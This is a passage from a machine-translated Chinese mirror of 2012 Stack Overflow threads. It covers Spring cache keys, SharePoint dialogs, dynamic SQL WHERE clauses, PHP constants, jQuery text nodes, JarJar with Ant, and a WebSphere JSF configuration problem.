package pkg.beans;

import org.springframework.stereotype.Repository;

public class KeyCreatorBean  implements ApplicationContextAware{
    private static ApplicationContext aCtx;
    public void setApplicationContext(ApplicationContext aCtx){
        KeyCreatorBean.aCtx = aCtx;
    }

    public static Object createKey(Object target, Method method, Object... params) {
        //store the bean somewhere..showing it like this purely to demonstrate..
        return aCtx.getBean("keyCreatorBean").createKey(target, method, params);
    }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T22:17:07.470

如果您有一个静态类函数，它将像这样工作

```
@Cacheable(value = "cacheName", key = "T(pkg.beans.KeyCreatorBean).createKey(#p0)")
@Override
public List<Examples> getExamples(ExampleId exampleId) {
  ...
} 
```

和

```
package pkg.beans;

import org.springframework.stereotype.Repository;

public class KeyCreatorBean  {

    public static Object createKey(Object o) {
        return Integer.valueOf((o != null) ? o.hashCode() : 53);
    }

} 
```

# sharepoint - Sharepoint 编辑表单取消不起作用。是Dlg = 1吗？

> ID：11396918
> 
> 赞同：2
> 
> 时间：2012-07-09T14:18:42.710
> 
> 标签：sharepoint, sharepoint-2010

下午，我的任务是对已不在公司的其他人的代码进行一些更改。好有挑战性！

以前的开发人员已经制作了一个链接列表，这些链接可以转到相应列表项的编辑页面，但是当用户想要取消时，他们不能。

当我深入研究时，似乎有一条额外的信息已被标记到 URL。

> IsDlg=1

（这是在 ?ID=1& 之后。如果我删除这个小动物，一切都会按预期工作！

但是左侧导航显示在编辑表单上。

理想情况下，我希望在取消按钮工作的情况下保持表单看起来原样（没有左手导航）。

有没有人有任何想法？我不介意只告诉使用左手导航将在那里，但如果我能避免它在那里会很好。

非常感谢任何帮助。

干杯特鲁兹

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-02-06T23:11:45.760

刚刚看到 David Lozzi 的这篇富有启发性的帖子“[我们都知道 IsDlg 做了什么……等等，什么……？](http://davidlozzi.com/2014/03/25/we-all-know-what-sharepoint-isdlg-does-wait-what-the/) ” 所以 SharePoint 中的技巧是使用 &isdlg=1（注意小写）

# sql - 在存储过程中构建动态 WHERE 子句

> ID：11396919
> 
> 赞同：20
> 
> 时间：2012-07-09T14:18:48.380
> 
> 标签：sql, sql-server, sql-server-2008, stored-procedures

我正在使用 SQL Server 2008 Express，并且我有一个`SELECT`基于参数执行来自表的存储过程。我有`nvarchar`参数和`int`参数。

这是我的问题，我的 where 子句如下所示：

```
WHERE [companies_SimpleList].[Description] Like @What 
    AND companies_SimpleList.Keywords Like @Keywords
    AND companies_SimpleList.FullAdress Like @Where
    AND companies_SimpleList.ActivityId = @ActivityId
    AND companies_SimpleList.DepartementId = @DepartementId
    AND companies_SimpleList.CityId = @CityId 
```

这个参数是我的 ASP.NET MVC 3 应用程序的用户设置的过滤器值，`int`可能没有设置参数，所以它们的值会是 0。这是我的问题，存储过程会搜索有`0`as`CityId`的项例如，为此，它返回错误的结果。因此，如果能够根据 int 参数的值是否大于 0，能够有一个动态的 where 子句，那就太好了。

提前致谢

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-07-09T14:22:58.477

试试这个：

```
WHERE 1 = 1
AND (@what     IS NULL OR [companies_SimpleList].[Description] Like @What )
AND (@keywords IS NULL OR companies_SimpleList.Keywords        Like @Keywords)
AND (@where    IS NULL OR companies_SimpleList.FullAdress      Like @Where)
... 
```

如果任何参数`@what`,`@where`被发送到带有`NULL`值的存储过程，则条件将被忽略。您可以使用 0 而不是 null 作为测试值，那么它将类似于`@what = 0 OR ...`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-09T14:21:30.943

尝试类似的东西

```
AND companies_SimpleList.CityId = @CityId or @CityID = 0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-24T16:07:17.990

这是 SQL Server >=2008 的另一个易于阅读的解决方案

```
CREATE PROCEDURE FindEmployee
    @Id INT = NULL,
    @SecondName NVARCHAR(MAX) = NULL
AS 
    SELECT  Employees.Id AS "Id",
            Employees.FirstName AS "FirstName",
            Employees.SecondName AS "SecondName"
    FROM Employees
    WHERE Employees.Id = COALESCE(@Id, Employees.Id)
    AND Employees.SecondName LIKE COALESCE(@SecondName, Employees.SecondName) + '%' 
```

# php - PHP - 从变量到常量的值

> ID：11396920
> 
> 赞同：2
> 
> 时间：2012-07-09T14:18:50.157
> 
> 标签：php, oop, variables, constants

我正在学习 PHP 中的 OOP，我想将值从变量放入类常量。我怎样才能做到这一点？

这是我的代码（不工作！）：

```
class Dir {

const ROOT = $_SERVER['DOCUMENT_ROOT']."project/";

function __construct() {

}
} 
```

是否有任何解决方案，如何从变量中获取值，添加字符串并将其放入常量 - 在 OOP 中？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:23:32.330

从手册页[http://www.php.net/manual/en/language.oop5.constants.php](http://www.php.net/manual/en/language.oop5.constants.php)您可以找到：

```
The value must be a constant expression, not (for example) a variable, a property, a result of a mathematical operation, or a function call. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T14:24:47.173

常量不能有变量。

我建议你不要依赖`$_SERVER['DOCUMENT_ROOT']`，相反，你可以定义`ROOT`你自己。

例如，您`config.php`在文档根目录中有一个，您可以这样做

```
define('ROOT', __DIR__.'/'); // php version >= 5.3
define('ROOT', dirname(__FILE__).'/'); // php version < 5.3 
```

然后`ROOT`改用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:45:35.180

Why not set it in your `__construct()`. Technically, that's what it is there for.

```
class Dir {

    public function __construct() {
        self::ROOT = $_SERVER['DOCUMENT_ROOT']."project/";
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-07T22:05:42.873

我建议您使用此解决方案，因为您想使用 OOP 并且所有人都必须在课堂内。因此，由于无法直接使用 const 或 static var，我将使用静态函数：

```
class Dir
{
    public static function getRoot()
    {
        return $_SERVER['DOCUMENT_ROOT'] . 'project/';
    }
} 
```

你可以像这样使用它

```
Dir::getRoot(); 
```

# clickonce - 在 pendrive 中运行 clickonce 应用程序，无需用户点击

> ID：11396922
> 
> 赞同：0
> 
> 时间：2012-07-09T14:18:59.163
> 
> 标签：clickonce, usb-drive

如何在插入时从 USB 设备运行 clickonce 应用程序而无需任何用户点击？不仅适用于特定用户的 PC，我还想为所有用户 PC 运行它。有没有办法实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-23T14:21:19.260

应该可以通过更改 USB 内部的一些驱动程序，使 USB 在 PC 中显示为 CD 并且 Autorun 将像在 CD 中一样工作。这就是如今 USB 加密狗的工作方式

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-10T01:00:34.583

如果没有任何点击，我想不出任何方法来做到这一点。至少，Windows 会出现并询问他们想用该设备做什么，对吧？

如果你能做到这一点，你可以编写病毒并感染某人的计算机，只需将 USB 驱动器插入其中即可。对我来说，这似乎不是一个最佳方案。

# java - 从那时起，用于优化获取和迭代的 Java 数据结构

> ID：11396923
> 
> 赞同：0
> 
> 时间：2012-07-09T14:19:00.500
> 
> 标签：java, data-structures, treeset

我需要一个数据结构在 Log N 时间内执行 get / find 并从 get 操作返回的对象开始迭代。迭代器应该按照元素插入数据结构的相同顺序进行迭代。

我可以使用 TreeSet 实现这一点吗？还是其他数据结构？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:23:22.710

如果您从 a 开始`SortedMap<Integer, Object>`并使用键来跟踪插入顺序，您将能够使用快速`tailMap`操作来满足您的需要。

如果您需要通过键（或者可能通过对象本身）找到对象的位置，那么引入另一个`WeakHashMap<Object, Integer>`将从您的键映射到对象位置的方法。然后，您将使用检索到的序列号作为前一个映射的键。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:25:35.173

此答案假定您希望*按值*获取/查找项目，而不是按*插入序列号*访问。我假设这个值与插入项目的顺序完全无关。

与标准 Java 基础类最接近的是[LinkedHashSet](http://docs.oracle.com/javase/7/docs/api/java/util/LinkedHashSet.html)。这允许按插入顺序进行快速搜索和迭代。但它不会给你一个从给定位置开始的迭代器，所以你必须自己实现它。要么基于`LinkedHashSet`，要么使用您自己的 set 实现。我想最简单的方法是使用 a`HashSet`并自己实现链接。这样，您可以使用 set 方法查找起始元素，并使用它在链接之后构造一个迭代器。您可以将链接隐藏在包装器对象中，因此您不必在 API 中公开它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:22:48.327

如果您使用的是 Java 6，则可以查看[ConcurrentSkipListSet](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ConcurrentSkipListSet.html)和[ConcurrentSkipListMap](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ConcurrentSkipListMap.html)。

# c# - 在 C# windows 应用程序中单击关闭按钮时如何防止应用程序关闭？

> ID：11396927
> 
> 赞同：-3
> 
> 时间：2012-07-09T14:19:09.527
> 
> 标签：c#, winforms, windows-applications

我正在用 C# 编写一个基于 Windows 窗体的应用程序。

当我单击`red cross(x)`窗口右上角的 时，它不应该停止程序的执行。它应该转到程序的下一部分。为了让我的程序以这种方式运行，我需要做什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:24:06.847

您可以使用表单关闭事件来取消表单的关闭。在设计器中单击属性中的照明符号，然后双击表单关闭条目。这应该为您制作代码。它应该使函数有点像这样：

```
private void Form1_FormClosing(object sender, FormClosingEventArgs e)
{
    e.Cancel = true;
} 
```

您需要添加`e.Cancel`将停止表单关闭的

# ant - 带有 Ant 的 JarJar - 如何使用规则文件

> ID：11396931
> 
> 赞同：3
> 
> 时间：2012-07-09T14:19:20.910
> 
> 标签：ant, jarjar

我想知道如何用 Ant 运行[JarJar](http://code.google.com/p/jarjar)，通过外部规则文件传递规则。

* * *

1）我知道我可以一一通过规则如下：

```
 <jarjar destfile="B.jar" >
        <zipfileset src="A.jar" />

        <rule pattern="com.a.**" result="test.b.@1" />
    </jarjar> 
```

2）我知道如果我从命令行运行它，我可以在文件中传递规则：

```
 java -jar jarjar.jar process <rulesFile> <inJar> <outJar> 
```

`<exec>`3) 我可以在 Ant任务中使用上述命令行。（最佳解决方法）

4) 我找到了一些关于在 Maven 中使用`<rulesFile>`标签的参考。

* * *

上述选项对于我想做的事情并不理想。

我想从 Ant 任务中运行 JarJar，并传入一个规则文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T07:57:41.503

我无法从任何论坛或通过邮寄 JarJar 的开发人员获得有关此问题的任何信息，因此我决定使用我正在使用的**解决方法来回答这个问题：**

*   使用 DOCTYPE & ENTITY xml 实体（根据[Ant 网站上的建议](http://ant.apache.org/faq.html#xml-entity-include)）

例如，以下`build.xml`文件包含另一个`test.txt`内联文件的内容。我使用标签导入文本文件`include_this`（这是我的名字 - 你可以在这里使用任何名字）：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE project [
    <!ENTITY include_this SYSTEM "test.txt">
]>

<project name="Test" default="build" >

    <target name="build" >
        &include_this;
    </target>

</project> 
```

在这个简单的例子中，`test.txt`文件的内容是：

```
<echo>This is a test.</echo> 
```

所以我一直在使用这个解决方法来替换`jarjar`调用中的规则。将规则放入`test.txt`文件中：

```
<rule pattern="com.**" result="${project.output}.com.@1" />
<rule pattern="org.**" result="${project.output}.org.@1" /> 
```

然后我的`jarjar`电话变成：

```
<!-- jarjar uses the same syntax as the jar task -->
<jarjar destfile="${jarjar.output.dir}/${project.output}.jar" >
    <!-- source files -->
    <zipfileset src="${jar.output.dir}/${project.output}.jar" />

    <!-- refactoring rules -->
    &include_this;
</jarjar> 
```

# javascript - jQuery，如何测试一个变量是一个文本节点，不包含标记？

> ID：11396936
> 
> 赞同：0
> 
> 时间：2012-07-09T14:19:32.623
> 
> 标签：javascript, jquery

[http://jsfiddle.net/DerNalia/zrppg/8/](http://jsfiddle.net/DerNalia/zrppg/8/)

我有两行代码几乎做同样的事情

```
var doesntbreak = $j("hello");
var breaks = $j("&nbsp;"); 
```

第一个没有错误，但第二个抛出这个

```
 Syntax error, unrecognized expression: &nbsp; 
```

他们不应该表现得一样吗？

关于如何解决这个问题的任何见解？在我使用的实际方法中，`ele`它来自 Dom，因此它可以是文本节点或任何其他类型的节点。

更新：

我注意到我正在使用的函数的输入是从dom中选择的。更新示例： http: [//jsfiddle.net/DerNalia/zrppg/11/](http://jsfiddle.net/DerNalia/zrppg/11/) <-包括 html 标记。

所以，我想，我的问题是，我如何测试某个东西是否只是一个文本节点？并且不包含任何标记？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:44:10.623

try this:

```
function isTextNode(node){
    div=document.createElement('div');
    div.innerHTML=node;
    return $(div).text()==$(div).html();
} 
```

And `"&nbsp;"` is'nt a valid selector if you want to find a elements containing some text you must use the :contains selector [http://api.jquery.com/contains-selector/](http://api.jquery.com/contains-selector/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:43:11.400

通常，您不能使用 jQuery 函数创建独立的文本节点。如果一个字符串显然不是 HTML，它会被视为一个选择器，并且`&nbsp;`不会被 jQuery 识别为一个有效的选择器。

假设您想解析任意字符串（可能有 HTML 标签或没有），我建议像`var result = $('<div></div>').html('&nbsp;').contents();`. 将您的 HTML 或文本字符串放在 div 中进行解析，然后立即将解析结果提取为带有元素列表的 jQuery 对象。您可以将生成的元素列表附加为`$(parentElem).append(result);`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:30:39.133

Internet Explorer（至少是旧版本）没有内置的“querySelector”功能，所以 Sizzle 引擎必须直接完成这项工作。因此，虚假输入的稍微不同的容差可能会导致错误报告的差异。

但是，您的选择器表达式`"&nbsp;"`在所有浏览器中同样无效。库没有义务悄悄地接受你传递给它的任何东西，所以也许你应该重新考虑你的应用程序设计。

如果您想检查实体，如果您确信它**只是**一个文本节点，则可以使用正则表达式。或者您可以使用`.text()`而不是获取内容`.html()`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-05-09T01:48:15.007

不是实际答案，但可以帮助与我有类似问题且与此问题相关的人。:)

我今天遇到了同样的问题，所以通过删除来解决`&nbsp;`

改变：

`var breaks = $j("&nbsp;");`

至：

`var breaks = $j("&nbsp;".replace(/&.*;/g, ""));`

在这里，我正在删除`&nbsp;`等`&lt;`...

**注意：**价值`&nbsp;`对我来说是动态的，所以它可以是任何东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-09T17:57:03.417

所以，我必须感谢[Apsillers](https://stackoverflow.com/users/710446/apsillers)和[Rolando](https://stackoverflow.com/users/1474943/rolando)为我指明了正确的方向。他们的回答非常接近，但给了我所需的信息。

这就是我最终使用的：

```
TEXT_NODE = 3;
objectify = function(n) {
    return $j("<div></div>").html(n).contents();
}

function textOnly(n) {
    var o = objectify(n);
    for (var i = 0; i < o.length; i++) {
        if (objectify(o[i])[0].nodeType != TEXT_NODE) {
            return false
        }
    }
    return true;
} 
```

这是一个

# [jsFiddle](http://jsfiddle.net/DerNalia/zrppg/14/)

对于一些测试用例，原始代码提交都没有通过。

要通过，它需要处理这种输入

```
"hello" // true
"hello<b>there</b>" // false
"<b>there</b>" // false
"&nbsp;" // false 
```

# jsf - websphere7 和 JSF 配置

> ID：11396938
> 
> 赞同：1
> 
> 时间：2012-07-09T14:19:37.743
> 
> 标签：jsf, websphere

我之前在tomcast中工作过JSF项目，当我将我的工作导入WEBsphere时，（我创建一个空的，并复制源代码），一开始，它工作！我可以看到y界面显示，所有的库和配置文件都工作了，但是当我再次尝试运行时，我认为jsf-api，impl-api有冲突，但是再次运行，它会自动部署到工作空间中，所以我将它们删除，并修改库部署路径，但直到现在才起作用！

上周到现在这让我很吃力，我不确定是什么问题，稍后我可以修复我在项目中看到的所有错误，但当前的问题是当我输入“web/index.jsp”或“web/home. jsf”都显示“网页无法显示”，但是在cosole窗口中没有错误，甚至显示/index.jsf已经初始化。我曾经怀疑web.xml有问题，在我一次又一次地尝试更改它之后，我发现它似乎没有错误。我不明白为什么它以前在相同的配置环境下工作，但现在失败了。

下面是我的 web.xml 和库列表

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_ID" version="2.4" xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <display-name>web</display-name>
    <context-param>
        <description>
        State saving method: 'client' or 'server' (=default). See JSF Specification 2.5.2</description>
        <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
        <param-value>client</param-value>
    </context-param>
    <context-param>
        <param-name>javax.servlet.jsp.jstl.fmt.localizationContext</param-name>
        <param-value>resources.application</param-value>
    </context-param>
    <context-param> 
<param-name>javax.faces.DEFAULT_SUFFIX</param-name> 
<param-value>.jsf</param-value> 
</context-param> 

    <listener>
        <listener-class>com.sun.faces.config.ConfigureListener</listener-class>
    </listener>
    <servlet>
        <servlet-name>Faces Servlet</servlet-name>
        <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>

    </servlet>
    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>/faces/*</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>*.jsf</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>Faces Servlet</servlet-name>
        <url-pattern>*.faces</url-pattern>
    </servlet-mapping>
    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
        <welcome-file>index.htm</welcome-file>
        <welcome-file>index.jsp</welcome-file>

    <welcome-file>index.faces</welcome-file>

        <welcome-file>default.html</welcome-file>
        <welcome-file>default.htm</welcome-file>
        <welcome-file>default.jsp</welcome-file>
    </welcome-file-list>
</web-app> 
```

库：

```
activation-impl.jar
aspectjrt.jar
bootstrap.jar
bsf-engines.jar
cimgr.ops.jar
com.ibm.cds_.jar
com.ibm.events.client.jar
com.ibm.events.service.jar
com.ibm.ffdc.jar
com.ibm.icu.jar
com.ibm.isclite.migration.jar
com.ibm.jaxb.tools.jar
com.ibm.jaxws.tools.jar
com.ibm.sec.authz.ibmsecauthz_7.0.jar
com.ibm.uddi.jar
com.ibm.ws.admin.core.jar
com.ibm.ws.admin.services.jar
com.ibm.ws.admin.system.jar
com.ibm.ws.amm.jar
 com.ibm.ws.bootstrap.jar
com.ibm.ws.cimgr.jar
com.ibm.ws.debug.osgi.jar
com.ibm.ws.eclipse.adaptors_7.0.0.jar
com.ibm.ws.ejbportable.jar
com.ibm.ws.emf.jar
com.ibm.ws.esi.jar
com.ibm.ws.jdt.core.jar
com.ibm.ws.jpa.jar
com.ibm.ws.mail.jar
com.ibm.ws.migration.jar
com.ibm.ws.policyset.migration.jar
com.ibm.ws.portletcontainer.ext.jar
com.ibm.ws.portletcontainer.jar
com.ibm.ws.prereq.analysis.engine.jar
com.ibm.ws.prereq.commonj-twm.jar
com.ibm.ws.prereq.commons-collections.jar
com.ibm.ws.prereq.commons-discovery.jar
com.ibm.ws.prereq.commons-logging.jar
com.ibm.ws.prereq.db2.intf.jar
com.ibm.ws.prereq.javamail.jar
 com.ibm.ws.prereq.jrom.jar
com.ibm.ws.prereq.la.jar
com.ibm.ws.prereq.nativefile.jar
com.ibm.ws.prereq.olt.jar
com.ibm.ws.prereq.otis.jar
com.ibm.ws.prereq.ow.asm.jar
com.ibm.ws.prereq.rmm.jar
com.ibm.ws.prereq.rxa.jar
com.ibm.ws.prereq.soap.jar
com.ibm.ws.prereq.syncml4j_2.6.0.jar
com.ibm.ws.prereq.toad.jar
com.ibm.ws.prereq.vajava.jar
com.ibm.ws.prereq.webtlsrn.jar
com.ibm.ws.prereq.wsdeploy.jar
com.ibm.ws.prereq.wsdl4j.jar
com.ibm.ws.prereq.xdi.jar
.ibm.ws.prereq.xlxp.jar
com.ibm.ws.proxy.admin.jar
com.ibm.ws.proxy.jar
com.ibm.ws.runtime.coregroupbridge.jar
com.ibm.ws.runtime.dist.jar
com.ibm.ws.runtime.gateway.jar
com.ibm.ws.runtime.jar
com.ibm.ws.security.crypto.jar
com.ibm.ws.sib.server.jar
com.ibm.ws.sib.utils.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.sib.wccm.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.sip.container.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.sip.interface.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.sip.proxy.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.sip.quorum.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.wccm.cimgr.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.wccm.compatibility.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.wccm.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.webcontainer.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.webmsg.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.webservices.migration.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.webservices.thinclient_7.0.0.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.webui.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.ws.wlm.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.wsfp.main.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.wspolicy.main.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.wspolicy4j.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.wsspi.extension.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.wsspi.proxy.extension.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.ibm.wsspi.rrd.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.tivoli.pd.amwas.core_6.1.0.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/com.tivoli.pd.amwas.tai_6.1.0.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commandlineutils.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commons-beanutils.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commons-collections.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commons-digester.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commons-discovery.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commons-lang-2.1.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/commons-logging.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/databeans.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/EJBCommandTarget.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/el-api.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/el-ri.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/ezmorph-1.0.6.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/ffdcSupport.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/hmkbdv.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/hmkcom.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/hmkkan.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/hmkmbr.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/hmksec.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/htmlshell.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/installver.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/installxml.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/iscdeploy.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/ivblogbr.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/IVTClient.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/j2ee.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/jacl.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.annotation.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.compatibility.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.connector.jar
file:/C:/Program Files/IBM/WebSphere/AppServer/7.0/profiles/oplopiJSF/installedApps/w00376586Node02Cell/web.ear/web.war/WEB-INF/lib/javax.j2ee.deploy.jar
